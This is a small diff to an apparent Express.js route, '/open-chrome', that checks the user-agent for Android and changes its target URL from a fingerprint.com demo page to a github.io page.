@@ -4,7 +4,7 @@ const app = express();
 
 app.get('/open-chrome', (req, res) => {
   const userAgent = req.headers['user-agent'];
-  const targetUrl = 'https://fingerprint.com/demo/';
+  const targetUrl = 'https://tiago-classy.github.io/XM_BOLD1';
   
   if (/android/i.test(userAgent)) {
     // Attempt to open in Chrome on AndroidPO
